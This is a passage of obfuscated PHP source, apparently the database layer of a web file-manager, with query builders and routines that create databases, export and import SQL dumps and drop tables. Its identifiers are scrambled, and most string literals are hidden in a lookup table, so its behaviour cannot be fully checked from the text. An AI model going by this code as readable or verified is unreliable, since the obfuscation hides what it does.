$this->parseBind(!empty($»Ëğòä¡[$õËä±Ú[371]]) ? $»Ëğòä¡[$õËä±Ú[371]] : array())); } public function update($¹¾±á©ú, $¸ÆÆÀ«À) { $ÀÒ¼ª†î =& $_SERVER[áäÒ½¯Ç]; $this->model = $¸ÆÆÀ«À[$ÀÒ¼ª†î[369]]; $²€ÍŠãŸ = $ÀÒ¼ª†î[1157] . $this->parseTable($¸ÆÆÀ«À[$ÀÒ¼ª†î[367]]) . $this->parseSet($¹¾±á©ú) . $this->parseWhere(!empty($¸ÆÆÀ«À[$ÀÒ¼ª†î[363]]) ? $¸ÆÆÀ«À[$ÀÒ¼ª†î[363]] : $ÀÒ¼ª†î[12]) . $this->parseOrder(!empty($¸ÆÆÀ«À[$ÀÒ¼ª†î[451]]) ? $¸ÆÆÀ«À[$ÀÒ¼ª†î[451]] : $ÀÒ¼ª†î[12]) . $this->parseLimit(!empty($¸ÆÆÀ«À[$ÀÒ¼ª†î[378]]) ? $¸ÆÆÀ«À[$ÀÒ¼ª†î[378]] : $ÀÒ¼ª†î[12]) . $this->parseLock(isset($¸ÆÆÀ«À[$ÀÒ¼ª†î[957]]) ? $¸ÆÆÀ«À[$ÀÒ¼ª†î[957]] : !1) . $this->parseComment(!empty($¸ÆÆÀ«À[$ÀÒ¼ª†î[439]]) ? $¸ÆÆÀ«À[$ÀÒ¼ª†î[439]] : $ÀÒ¼ª†î[12]); return $this->execute($²€ÍŠãŸ, $this->parseBind(!empty($¸ÆÆÀ«À[$ÀÒ¼ª†î[371]]) ? $¸ÆÆÀ«À[$ÀÒ¼ª†î[371]] : array())); } public function delete($öó“›Å = array()) { $©¸ÜÌâù =& $_SERVER[áäÒ½¯Ç]; $this->model = $öó“›Å[$©¸ÜÌâù[369]]; $íªğğÈì = $©¸ÜÌâù[1158] . $this->parseTable($öó“›Å[$©¸ÜÌâù[367]]) . $this->parseWhere(!empty($öó“›Å[$©¸ÜÌâù[363]]) ? $öó“›Å[$©¸ÜÌâù[363]] : $©¸ÜÌâù[12]) . $this->parseOrder(!empty($öó“›Å[$©¸ÜÌâù[451]]) ? $öó“›Å[$©¸ÜÌâù[451]] : $©¸ÜÌâù[12]) . $this->parseLimit(!empty($öó“›Å[$©¸ÜÌâù[378]]) ? $öó“›Å[$©¸ÜÌâù[378]] : $©¸ÜÌâù[12]) . $this->parseLock(isset($öó“›Å[$©¸ÜÌâù[957]]) ? $öó“›Å[$©¸ÜÌâù[957]] : !1) . $this->parseComment(!empty($öó“›Å[$©¸ÜÌâù[439]]) ? $öó“›Å[$©¸ÜÌâù[439]] : $©¸ÜÌâù[12]); return $this->execute($íªğğÈì, $this->parseBind(!empty($öó“›Å[$©¸ÜÌâù[371]]) ? $öó“›Å[$©¸ÜÌâù[371]] : array())); } public function select($Û Øíù = array()) { $ş³Ô÷»® =& $_SERVER[áäÒ½¯Ç]; $this->model = $Û Øíù[$ş³Ô÷»®[369]]; $îØõâÔâ = $this->buildSelectSql($Û Øíù); $û—‰œ³Î = isset($Û Øíù[$ş³Ô÷»®[434]]) ? $Û Øíù[$ş³Ô÷»®[434]] : !1; if ($û—‰œ³Î) { $­öÇ¾– = is_string($û—‰œ³Î[$ş³Ô÷»®[95]]) ? $û—‰œ³Î[$ş³Ô÷»®[95]] : $ş³Ô÷»®[1159] . md5($îØõâÔâ); $ëˆê•û¬ = think_cache($­öÇ¾–, $ş³Ô÷»®[12], $û—‰œ³Î); if (!1 !== $ëˆê•û¬) { return $ëˆê•û¬; } } $é­Ë¢¢º = $this->query($îØõâÔâ, $this->parseBind(!empty($Û Øíù[$ş³Ô÷»®[371]]) ? $Û Øíù[$ş³Ô÷»®[371]] : array())); if ($û—‰œ³Î && !1 !== $é­Ë¢¢º) { think_cache($­öÇ¾–, $é­Ë¢¢º, $û—‰œ³Î); } return $é­Ë¢¢º; } public function buildSelectSql($ŞÕ¡ÏÁ¦ = array()) { $ÛŠìÌÒÀ =& $_SERVER[áäÒ½¯Ç]; if (isset($ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[438]])) { if (strpos($ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[438]], $ÛŠìÌÒÀ[50])) { list($ŸÜãÎÁ¶, $­š˜¢ŸÄ) = explode($ÛŠìÌÒÀ[50], $ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[438]]); } else { $ŸÜãÎÁ¶ = $ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[438]]; } $ŸÜãÎÁ¶ = $ŸÜãÎÁ¶ ? $ŸÜãÎÁ¶ : 1; $­š˜¢ŸÄ = isset($­š˜¢ŸÄ) ? $­š˜¢ŸÄ : (is_numeric($ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[378]]) ? $ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[378]] : 20); $Äê´Û = $­š˜¢ŸÄ * ((int) $ŸÜãÎÁ¶ - 1); $ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[378]] = $Äê´Û . $ÛŠìÌÒÀ[50] . $­š˜¢ŸÄ; } if (think_config($ÛŠìÌÒÀ[1160])) { $ûâÊÉ“ï = $ÛŠìÌÒÀ[1161] . md5(serialize($ŞÕ¡ÏÁ¦)); $–ì ×Ô¶ = think_cache($ûâÊÉ“ï); if ($–ì ×Ô¶) { return $–ì ×Ô¶; } } $•ë–Ô·Ÿ = $this->parseSql($this->selectSql, $ŞÕ¡ÏÁ¦); $•ë–Ô·Ÿ .= $this->parseLock(isset($ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[957]]) ? $ŞÕ¡ÏÁ¦[$ÛŠìÌÒÀ[957]] : !1); if (isset($ûâÊÉ“ï)) { think_cache($ûâÊÉ“ï, $•ë–Ô·Ÿ); } return $•ë–Ô·Ÿ; } public function parseSql($Í¬œ•Ş, $ú„±›Ÿº = array()) { $“« ¨Êø =& $_SERVER[áäÒ½¯Ç]; $Í¬œ•Ş = str_replace(array($“« ¨Êø[1162], $“« ¨Êø[1163], $“« ¨Êø[1164], $“« ¨Êø[1165], $“« ¨Êø[1166], $“« ¨Êø[1167], $“« ¨Êø[1168], $“« ¨Êø[1169], $“« ¨Êø[1170], $“« ¨Êø[1171], $“« ¨Êø[1172]), array($this->parseTable("{$ú„±›Ÿº[$“« ¨Êø[367]]}"), $this->parseDistinct(isset($ú„±›Ÿº[$“« ¨Êø[1173]]) ? $ú„±›Ÿº[$“« ¨Êø[1173]] : !1), $this->parseField(!empty($ú„±›Ÿº[$“« ¨Êø[361]]) ? $ú„±›Ÿº[$“« ¨Êø[361]] : $“« ¨Êø[231]), $this->parseJoin(!empty($ú„±›Ÿº[$“« ¨Êø[370]]) ? $ú„±›Ÿº[$“« ¨Êø[370]] : $“« ¨Êø[12]), $this->parseWhere(!empty($ú„±›Ÿº[$“« ¨Êø[363]]) ? $ú„±›Ÿº[$“« ¨Êø[363]] : $“« ¨Êø[12]), $this->parseGroup(!empty($ú„±›Ÿº[$“« ¨Êø[603]]) ? $ú„±›Ÿº[$“« ¨Êø[603]] : $“« ¨Êø[12]), $this->parseHaving(!empty($ú„±›Ÿº[$“« ¨Êø[1174]]) ? $ú„±›Ÿº[$“« ¨Êø[1174]] : $“« ¨Êø[12]), $this->parseOrder(!empty($ú„±›Ÿº[$“« ¨Êø[451]]) ? $ú„±›Ÿº[$“« ¨Êø[451]] : $“« ¨Êø[12]), $this->parseLimit(!empty($ú„±›Ÿº[$“« ¨Êø[378]]) ? $ú„±›Ÿº[$“« ¨Êø[378]] : $“« ¨Êø[12]), $this->parseUnion(!empty($ú„±›Ÿº[$“« ¨Êø[432]]) ? $ú„±›Ÿº[$“« ¨Êø[432]] : $“« ¨Êø[12]), $this->parseComment(!empty($ú„±›Ÿº[$“« ¨Êø[439]]) ? $ú„±›Ÿº[$“« ¨Êø[439]] : $“« ¨Êø[12])), $Í¬œ•Ş); return $Í¬œ•Ş; } public function getLastSql($ŒßãÃÃ = '') { return $ŒßãÃÃ ? $this->modelSql[$ŒßãÃÃ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($µş¼Î¹¿) { return addslashes($µş¼Î¹¿); } public function setModel($ÀİÀ–«ã) { $this->model = $ÀİÀ–«ã; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($úË´Ô´à = array()) { $À³ÔËü =& $_SERVER[áäÒ½¯Ç]; if (empty($úË´Ô´à)) { $úË´Ô´à = $GLOBALS[$À³ÔËü[6]][$À³ÔËü[21]]; } $this->database = $úË´Ô´à; } public function model($úĞ³Ñğ = '') { return new ModelBase($úĞ³Ñğ, $_SERVER[áäÒ½¯Ç][12], $this->database); } public function db($ıóüôÁª = false) { $ã¨…Ë·ô =& $_SERVER[áäÒ½¯Ç]; $àï’Úä™ = array_change_key_case($this->database); if ($this->dbType() == $ã¨…Ë·ô[13] || !$ıóüôÁª) { return $this->model()->db(); } $­É¶×³© = $àï’Úä™[$ã¨…Ë·ô[1088]]; $àï’Úä™[$ã¨…Ë·ô[1088]] = $ã¨…Ë·ô[12]; if ($àï’Úä™[$ã¨…Ë·ô[1083]] == $ã¨…Ë·ô[1080]) { $Ç–ê‹×Ñ = $àï’Úä™[$ã¨…Ë·ô[1089]]; $àï’Úä™[$ã¨…Ë·ô[1089]] = substr($Ç–ê‹×Ñ, 0, strrpos($Ç–ê‹×Ñ, $ã¨…Ë·ô[1175])); } $this->database = $àï’Úä™; $–ç¶°Š = $this->model()->db(); try { $à³ı§ªŞ = $–ç¶°Š->execute("\x73\x68\157\x77\40\x64\141\x74\x61\142\141\x73\x65\x73\40\x6c\x69\153\145\40\47{$­É¶×³©}\x27"); } catch (Exception $ê˜½ĞÃò) { } if (!$à³ı§ªŞ) { $–ç¶°Š->execute("\143\x72\145\x61\164\x65\40\144\141\164\141\x62\141\163\145\x20\x60{$­É¶×³©}\140"); } $àï’Úä™[$ã¨…Ë·ô[1088]] = $­É¶×³©; if ($àï’Úä™[$ã¨…Ë·ô[1083]] == $ã¨…Ë·ô[1080]) { $àï’Úä™[$ã¨…Ë·ô[1089]] .= $ã¨…Ë·ô[1175] . $­É¶×³©; } $this->database = $àï’Úä™; $–ç¶°Š->execute("\165\x73\145\40\x60{$­É¶×³©}\x60"); return $–ç¶°Š; } public function createTable($¢æÆÆ¤Ğ, &$Æ‘µ·„™) { $ôšœ×ã =& $_SERVER[áäÒ½¯Ç]; if (!IO::exist($¢æÆÆ¤Ğ)) { show_json(LNG($ôšœ×ã[1176]), !1); } $åìĞ› = $this->model()->db(); $µàğïêñ = sqlSplit(IO::getContent($¢æÆÆ¤Ğ)); foreach ($µàğïêñ as $òËéĞ®) { $ÈŒÊñ°¨ = stripos($òËéĞ®, $ôšœ×ã[1177]) === 0; if ($ÈŒÊñ°¨) { $Æ‘µ·„™->task[$ôšœ×ã[1178]] += 1; } $åìĞ›->execute($òËéĞ®); if ($ÈŒÊñ°¨) { preg_match($ôšœ×ã[1179], $òËéĞ®, $ÄšëŸÃÑ); $Æ‘µ·„™->task[$ôšœ×ã[1180]] = $ÄšëŸÃÑ[1]; $Æ‘µ·„™->update(1); } } } public function insertTable($ş÷³ğŒÜ, &$ÂèŒœÉË) { $—ñ±£ìİ =& $_SERVER[áäÒ½¯Ç]; $¼ˆ ÌüÂ = $this->model()->db(); $Ò–¶•òı = $…øˆÄµ¸ ? array($…øˆÄµ¸) : $¼ˆ ÌüÂ->getTables(); foreach ($ş÷³ğŒÜ as $¨äÊ®Á) { $…øˆÄµ¸ = basename($¨äÊ®Á, $—ñ±£ìİ[895]); if (!in_array($…øˆÄµ¸, $Ò–¶•òı)) { continue; } $ÂèŒœÉË->task[$—ñ±£ìİ[1180]] = $…øˆÄµ¸; if ($…øˆÄµ¸ == $—ñ±£ìİ[889]) { continue; } if (get_filesize($¨äÊ®Á) == 0) { continue; } $Æ€ºÚş = $this->sqlToDb($¨äÊ®Á, $ÂèŒœÉË); if (!$Æ€ºÚş) { show_json(LNG($—ñ±£ìİ[1181]) . "\133{$…øˆÄµ¸}\x5d", !1); } } } public function sqlFromDb($¼­Áï…¨, $»ÈÊ¸ñ, &$ÏãŸÊÙ², $÷êÈ‚¢ = '') { if ($ÏãŸÊÙ²) { $ÏãŸÊÙ²->task[$_SERVER[áäÒ½¯Ç][1180]] = $¼­Áï…¨; } $ŸØ‰ê»Ö = $this->model($¼­Áï…¨); $•ºŸ¼Ó‘ = 0; $¢µ•Šµ = 0; $Å¥‰ùŒ¹ = 10000; $Æàş”ƒ‚ = fopen($»ÈÊ¸ñ, $_SERVER[áäÒ½¯Ç][1182]); $¾öÁç‘ı = $ŸØ‰ê»Ö->getPk(); $»¼ııŠû = $ŸØ‰ê»Ö->getDbFields(); $Ú»ÀÁå¯ = $_SERVER[áäÒ½¯Ç][12]; if ($GLOBALS[$_SERVER[áäÒ½¯Ç][894]] && in_array($¼­Áï…¨, array($_SERVER[áäÒ½¯Ç][1183], $_SERVER[áäÒ½¯Ç][1184]))) { $Ú»ÀÁå¯ = $¼­Áï…¨; } do { $ÌÒ¼şÏ = array($¾öÁç‘ı => array($_SERVER[áäÒ½¯Ç][1130], $¢µ•Šµ)); $‚á‰»‹ = $ŸØ‰ê»Ö->where($ÌÒ¼şÏ)->field($»¼ııŠû)->order($¾öÁç‘ı . $_SERVER[áäÒ½¯Ç][1185])->limit($Å¥‰ùŒ¹)->select(); $‚á‰»‹ = !empty($‚á‰»‹) ? $‚á‰»‹ : array(); if (!($óÍúß˜‰ = count($‚á‰»‹))) { break; } $€½¦›ŞÈ = end($‚á‰»‹); $¢µ•Šµ = $€½¦›ŞÈ[$¾öÁç‘ı]; $–Ñ”™æ¥ = array(); foreach ($‚á‰»‹ as $æ„ÄØ²€) { if ($Ú»ÀÁå¯) { if ($¼­Áï…¨ == $_SERVER[áäÒ½¯Ç][1183]) { if ($æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][33]] == $_SERVER[áäÒ½¯Ç][1186]) { $ºíŠÇ¾É = json_decode($æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][460]], !0); if ($ºíŠÇ¾É[$_SERVER[áäÒ½¯Ç][32]] == $GLOBALS[$_SERVER[áäÒ½¯Ç][894]] && $ºíŠÇ¾É[$_SERVER[áäÒ½¯Ç][852]] != 1) { continue; } } } else { if ($æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][33]] == $_SERVER[áäÒ½¯Ç][1187] && $æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][95]] == $_SERVER[áäÒ½¯Ç][890]) { continue; } } } if ($÷êÈ‚¢) { $æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][87]] = "\x7b\x69\x6f\72{$÷êÈ‚¢}\175" . substr($æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][87]], strlen("\173\151\157\x3a{$æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][928]]}\175")); $æ„ÄØ²€[$_SERVER[áäÒ½¯Ç][928]] = $÷êÈ‚¢; } $–Ñ”™æ¥[] = $_SERVER[áäÒ½¯Ç][1188] . $this->sqlEncode($æ„ÄØ²€) . $_SERVER[áäÒ½¯Ç][1189]; } $À°ò°¼æ = "\111\116\123\x45\122\x54\x20\x49\116\124\117\x20\140{$¼­Áï…¨}\140\x20\50\x60" . implode($_SERVER[áäÒ½¯Ç][1190], $»¼ııŠû) . $_SERVER[áäÒ½¯Ç][1191]; fwrite($Æàş”ƒ‚, $À°ò°¼æ . implode($_SERVER[áäÒ½¯Ç][1192], $–Ñ”™æ¥) . $_SERVER[áäÒ½¯Ç][74] . PHP_EOL); $•ºŸ¼Ó‘ += $óÍúß˜‰; if ($ÏãŸÊÙ²) { $ÏãŸÊÙ²->update($óÍúß˜‰); } } while ($Å¥‰ùŒ¹ == $óÍúß˜‰); fclose($Æàş”ƒ‚); return $•ºŸ¼Ó‘; } public function sqlToDb($ÁåèÉúê, &$œ«ÇÏ±Ù) { $û¹°Ëè¤ =& $_SERVER[áäÒ½¯Ç]; $”®¨È’Ğ = $this->model()->db(); $»ã ĞûŸ = @fopen($ÁåèÉúê, $û¹°Ëè¤[1193]); if (!$»ã ĞûŸ) { return !1; } $°³ ñáÀ = 0; $ç‹¦‹ÊÏ = $û¹°Ëè¤[12]; $—ƒî¶‡Û = array(); $™Ø‡¨öè = $this->dbType(); $¶®ŸóäÀ = $™Ø‡¨öè == $û¹°Ëè¤[13] ? 500 : 2000; $ÇĞ™˜½— = basename($ÁåèÉúê, $û¹°Ëè¤[895]); $úò˜ŞéÅ = 0; $ı’ƒ¦ïé = 4194304; while (!feof($»ã ĞûŸ)) { $¼§Ûµ¹ª = trim(fgets($»ã ĞûŸ)); if (!$¼§Ûµ¹ª) { continue; } $è¨şÓšŞ = $this->sqlDecode($¼§Ûµ¹ª, $™Ø‡¨öè, $ÇĞ™˜½—); if (stripos($è¨şÓšŞ, $û¹°Ëè¤[440]) === 0) { if (!$ç‹¦‹ÊÏ) { $ç‹¦‹ÊÏ = $è¨şÓšŞ . $û¹°Ëè¤[53]; } continue; } if ($œ«ÇÏ±Ù) { $œ«ÇÏ±Ù->task[$û¹°Ëè¤[1178]] += 1; } $°³ ñáÀ++; $—ƒî¶‡Û[] = rtrim(rtrim(trim($è¨şÓšŞ), $û¹°Ëè¤[50]), $û¹°Ëè¤[74]); $–¶Úˆ“Ÿ = null; $Ì£Â™« = strlen($è¨şÓšŞ); $úò˜ŞéÅ += $Ì£Â™«; $’ëÎ•Ÿê = strlen($ç‹¦‹ÊÏ) + $úò˜ŞéÅ + (count($—ƒî¶‡Û) - 1); if ($’ëÎ•Ÿê >= $ı’ƒ¦ïé) { $–¶Úˆ“Ÿ = array_pop($—ƒî¶‡Û); if ($°³ ñáÀ > 1) { $°³ ñáÀ--; } } if ($°³ ñáÀ >= $¶®ŸóäÀ || $–¶Úˆ“Ÿ) { $è¨şÓšŞ = $ç‹¦‹ÊÏ . implode($û¹°Ëè¤[50], $—ƒî¶‡Û); if (!$”®¨È’Ğ->execute($è¨şÓšŞ)) { return !1; } if ($œ«ÇÏ±Ù) { $œ«ÇÏ±Ù->update($°³ ñáÀ); } $—ƒî¶‡Û = array(); $°³ ñáÀ = 0; $úò˜ŞéÅ = 0; if ($–¶Úˆ“Ÿ) { $—ƒî¶‡Û = array($–¶Úˆ“Ÿ); $°³ ñáÀ = 1; $úò˜ŞéÅ = $Ì£Â™«; } } } fclose($»ã ĞûŸ); if (!empty($—ƒî¶‡Û)) { $è¨şÓšŞ = $ç‹¦‹ÊÏ . implode($û¹°Ëè¤[50], $—ƒî¶‡Û); if (!$”®¨È’Ğ->execute($è¨şÓšŞ)) { return !1; } if ($œ«ÇÏ±Ù) { $œ«ÇÏ±Ù->update($°³ ñáÀ); } } return !0; } public function dropTable($ ßñØ = null) { $õİÌÕŠ =& $_SERVER[áäÒ½¯Ç]; $ÏÌÇ÷İ = $this->model()->db(); $—ºÊ¨úÏ = $ ßñØ ? array($ ßñØ) : $ÏÌÇ÷İ->getTables(); if (!$—ºÊ¨úÏ) { return; } foreach ($—ºÊ¨úÏ as $ ßñØ) { if ($ ßñØ) { $ ßñØ = strtolower($ ßñØ); } else { continue; } $ÏÌÇ÷İ->execute($õİÌÕŠ[1194] . $this->escapeName($ ßñØ) . $õİÌÕŠ[1195]); } } private function sqlEncode($—»öÈãÌ) { $‡¥ô¡‹´ =& $_SERVER[áäÒ½¯Ç]; $Âü —ü = array(); foreach ($—»öÈãÌ as $Ùó¹ó¸¶) { if (is_array($Ùó¹ó¸¶)) { $Ùó¹ó¸¶ = json_encode_force($Ùó¹ó¸¶); } $Ùó¹ó¸¶ = addslashes($Ùó¹ó¸¶); $Ùó¹ó¸¶ = str_replace(array($‡¥ô¡‹´[1196], $‡¥ô¡‹´[221], $‡¥ô¡‹´[427]), array($‡¥ô¡‹´[1197], $‡¥ô¡‹´[1198], $‡¥ô¡‹´[1199]), $Ùó¹ó¸¶); $Âü —ü[] = $Ùó¹ó¸¶; } return $‡¥ô¡‹´[58] . implode($‡¥ô¡‹´[1200], $Âü —ü) . $‡¥ô¡‹´[58]; } private function sqlDecode($ûèßïˆş, $ãÉÔÀï, $ç±—„äª = '') { $ÁÌÕ · =& $_SERVER[áäÒ½¯Ç]; $ûèßïˆş = str_replace(array($ÁÌÕ ·[1197], $ÁÌÕ ·[1198], $ÁÌÕ ·[1199]), array($ÁÌÕ ·[1196], $ÁÌÕ ·[221], $ÁÌÕ ·[427]), $ûèßïˆş); if ($ãÉÔÀï == $ÁÌÕ ·[13]) { $ûèßïˆş = str_ireplace($ÁÌÕ ·[1201], $ÁÌÕ ·[59], $ûèßïˆş); $ûèßïˆş = stripslashes($ûèßïˆş); } return preg_replace($ÁÌÕ ·[1202], $ÁÌÕ ·[12], $ûèßïˆş); if ($ãÉÔÀï == $ÁÌÕ ·[13]) { return $ç±—„äª != $ÁÌÕ ·[889] ? stripslashes($ûèßïˆş) : $ûèßïˆş; } if ($ç±—„äª == $ÁÌÕ ·[889]) { $ûèßïˆş = str_replace($ÁÌÕ ·[1203], $ÁÌÕ ·[119], stripslashes($ûèßïˆş)); } return $ûèßïˆş; } public function getSqlFile($ùÇä™¤ = '') { $ö®ĞÂÕº =& $_SERVER[áäÒ½¯Ç]; $¤†áÍ© = $this->dbType(!0); $è­Ì¢Â” = CONTROLLER_DIR . "\x69\156\163\x74\141\x6c\x6c\57\144\x61\164\x61\x2f{$¤†áÍ©}\56\x73\161\154"; if (!file_exists($è­Ì¢Â”)) { return !1; } $óÍòƒˆò = file_get_contents($è­Ì¢Â”); $­Æµì¨Î = $ö®ĞÂÕº[1204] . ($¤†áÍ© == $ö®ĞÂÕº[906] ? $ö®ĞÂÕº[1205] : $ö®ĞÂÕº[1206]) . $ö®ĞÂÕº[1207]; preg_match_all($­Æµì¨Î, $óÍòƒˆò, $ù˜õ Ù); $¼ô¡ş¼Û = $ù˜õ Ù[1]; $ÊÑÓ¹Ôš = $this->model()->db(); $¢ëø¨§Ò = $ÊÑÓ¹Ôš->getTables(); $ğ®”Ã¨ = TEMP_FILES . $ö®ĞÂÕº[1208] . date($ö®ĞÂÕº[270]) . $ö®ĞÂÕº[8]; del_dir($ğ®”Ã¨); mk_dir($ğ®”Ã¨); $‹²¶íÓé = $ğ®”Ã¨ . $ö®ĞÂÕº[1209]; $ê§Äû = $ğ®”Ã¨ . $ö®ĞÂÕº[1210]; $Õ’²ï©¹ = $¤†áÍ© == $ö®ĞÂÕº[13] ? $ö®ĞÂÕº[906] : $ö®ĞÂÕº[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\154\x6c\x2f\144\x61\164\141\57{$Õ’²ï©¹}\x2e\163\161\x6c", $ğ®”Ã¨); @touch($ğ®”Ã¨ . $¤†áÍ© . $ö®ĞÂÕº[895]); $Á÷îµÙ = fopen($‹²¶íÓé, $ö®ĞÂÕº[1182]); $ó÷æ”Ä = fopen($ê§Äû, $ö®ĞÂÕº[1182]); if ($¤†áÍ© == $ö®ĞÂÕº[13]) { $¢ëø¨§Ò = array_diff($¢ëø¨§Ò, array($ö®ĞÂÕº[887], $ö®ĞÂÕº[888])); $å©ôç­à = array($ö®ĞÂÕº[1211], $ö®ĞÂÕº[1212], $ö®ĞÂÕº[1213]); fwrite($ó÷æ”Ä, implode(PHP_EOL, $å©ôç­à) . PHP_EOL . PHP_EOL); foreach ($¢ëø¨§Ò as $„ËÜÉë) { $‰™÷¶ß” = $this->sqlFromSqlite($„ËÜÉë); if (!$‰™÷¶ß”[$ö®ĞÂÕº[13]]) { continue; } fwrite($ó÷æ”Ä, $‰™÷¶ß”[$ö®ĞÂÕº[13]] . PHP_EOL . PHP_EOL); if (!in_array($„ËÜÉë, $¼ô¡ş¼Û)) { fwrite($Á÷îµÙ, $‰™÷¶ß”[$ö®ĞÂÕº[906]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¢ëø¨§Ò as $„ËÜÉë) { $‰™÷¶ß” = $this->sqlFromMysql($„ËÜÉë); if (!$‰™÷¶ß”[$ö®ĞÂÕº[906]]) { continue; } fwrite($Á÷îµÙ, $‰™÷¶ß”[$ö®ĞÂÕº[906]] . PHP_EOL . PHP_EOL); if (!in_array($„ËÜÉë, $¼ô¡ş¼Û)) { fwrite($ó÷æ”Ä, $‰™÷¶ß”[$ö®ĞÂÕº[13]] . PHP_EOL . PHP_EOL); } } } fclose($Á÷îµÙ); fclose($ó÷æ”Ä); $óÍòƒˆò = array($ö®ĞÂÕº[906] => $‹²¶íÓé, $ö®ĞÂÕº[13] => $ê§Äû); return $ùÇä™¤ ? $óÍòƒˆò[$ùÇä™¤] : $óÍòƒˆò; } public function dbType($¢§ĞÙŞ = false) { $£æ§ƒˆ =& $_SERVER[áäÒ½¯Ç]; $÷Š‘­ûè = $¢§ĞÙŞ ? $GLOBALS[$£æ§ƒˆ[6]][$£æ§ƒˆ[21]] : $this->database; $÷Š‘­ûè = array_change_key_case($÷Š‘­ûè); $ÄÔìş»á = $÷Š‘­ûè[$£æ§ƒˆ[1083]]; if ($ÄÔìş»á == $£æ§ƒˆ[1080]) { $ËÂ¿Š¥ë = explode($£æ§ƒˆ[4], $÷Š‘­ûè[$£æ§ƒˆ[1089]]); $ÄÔìş»á = $ËÂ¿Š¥ë[0]; } $ƒ”ÛÌ› = array($£æ§ƒˆ[1214] => $£æ§ƒˆ[13], $£æ§ƒˆ[1028] => $£æ§ƒˆ[906]); if (isset($ƒ”ÛÌ›[$ÄÔìş»á])) { $ÄÔìş»á = $ƒ”ÛÌ›[$ÄÔìş»á]; } return $ÄÔìş»á; } public function sqlFromMysql($ÍŒ¶Ì²Ã, $˜âòˆÊ = '') { $³‰÷„øÛ =& $_SERVER[áäÒ½¯Ç]; $›­“Ûª = array($³‰÷„øÛ[906] => $³‰÷„øÛ[12], $³‰÷„øÛ[13] => $³‰÷„øÛ[12]); $æÌÇ¹Ñš = $this->escapeName($ÍŒ¶Ì²Ã); $ğ´‰’Ÿ» = $this->escapeName($ÍŒ¶Ì²Ã, $³‰÷„øÛ[13]); $û±ÉÂ® = $this->model()->db(); $öªØ£Ê£ = $û±ÉÂ®->query("\x73\150\157\x77\40\143\162\x65\x61\164\x65\40\164\x61\x62\154\x65\x20{$æÌÇ¹Ñš}\x3b"); if (!$öªØ£Ê£ || !$öªØ£Ê£[0]) { return !1; } $ë˜µ‚ƒâ = _get($öªØ£Ê£[0], $³‰÷„øÛ[1215], $³‰÷„øÛ[12]); if (!$ë˜µ‚ƒâ) { return !1; } $…¹ŸµŒ = "\104\122\x4f\x50\40\x54\x41\x42\114\x45\40\x49\106\x20\x45\x58\111\123\124\x53\40{$æÌÇ¹Ñš}\73" . PHP_EOL . $ë˜µ‚ƒâ . $³‰÷„øÛ[74]; if ($˜âòˆÊ == $³‰÷„øÛ[906]) { return $…¹ŸµŒ; } $›­“Ûª[$³‰÷„øÛ[906]] = $…¹ŸµŒ; $ñÔ¢ÅÒù = array_change_key_case($GLOBALS[$³‰÷„øÛ[6]][$³‰÷„øÛ[21]]); $¤¾ËÄ‚† = $ñÔ¢ÅÒù[$³‰÷„øÛ[1088]]; $­€üî° = $³‰÷„øÛ[1216] . $¤¾ËÄ‚† . "\x27\x20\101\116\x44\40\x54\101\x42\114\x45\137\x4e\101\115\x45\x20\75\x20{$ğ´‰’Ÿ»}\73"; $·«ãû’± = "\123\110\117\127\x20\x49\116\104\x45\130\40\106\x52\x4f\x4d\x20{$æÌÇ¹Ñš}\73"; $¨ºşÌª— = $û±ÉÂ®->query($­€üî°); if (empty($¨ºşÌª—)) { return $˜âòˆÊ ? $›­“Ûª[$˜âòˆÊ] : $›­“Ûª; } $üğ ¬É = $û±ÉÂ®->query($·«ãû’±); $×ÃÆÅ¬ = $³‰÷„øÛ[12]; $­“‹ß»ü = array(); foreach ($üğ ¬É as $òƒâÓ®Ò) { if (!$×ÃÆÅ¬ && $òƒâÓ®Ò[$³‰÷„øÛ[1217]] == $³‰÷„øÛ[1218]) { $×ÃÆÅ¬ = $òƒâÓ®Ò[$³‰÷„øÛ[1219]]; } if (isset($­“‹ß»ü[$òƒâÓ®Ò[$³‰÷„øÛ[1217]]])) { $­“‹ß»ü[$òƒâÓ®Ò[$³‰÷„øÛ[1217]]][$³‰÷„øÛ[1220]][] = $òƒâÓ®Ò[$³‰÷„øÛ[1219]]; continue; } $­“‹ß»ü[$òƒâÓ®Ò[$³‰÷„øÛ[1217]]] = array($³‰÷„øÛ[1221] => $òƒâÓ®Ò[$³‰÷„øÛ[1217]], $³‰÷„øÛ[1220] => array($òƒâÓ®Ò[$³‰÷„øÛ[1219]]), $³‰÷„øÛ[1222] => $òƒâÓ®Ò[$³‰÷„øÛ[1223]] == $³‰÷„øÛ[91] ? 0 : 1); } $ç¯½¨´À = array(); foreach ($­“‹ß»ü as $òƒâÓ®Ò) { $ç¼Ì´Ÿ´ = $òƒâÓ®Ò[$³‰÷„øÛ[1221]] == $³‰÷„øÛ[1218]; $¾œ¹Ö› = $òƒâÓ®Ò[$³‰÷„øÛ[1222]] == $³‰÷„øÛ[91] && !$ç¼Ì´Ÿ´ ? $³‰÷„øÛ[1224] : $³‰÷„øÛ[12]; $ø¿³­ö = $³‰÷„øÛ[1225] . $ÍŒ¶Ì²Ã . $³‰÷„øÛ[11] . ($ç¼Ì´Ÿ´ ? $³‰÷„øÛ[1226] : $òƒâÓ®Ò[$³‰÷„øÛ[1221]]); $êéÄÂÊè = $³‰÷„øÛ[1227] . implode($³‰÷„øÛ[1228], $òƒâÓ®Ò[$³‰÷„øÛ[1220]]) . $³‰÷„øÛ[1229]; 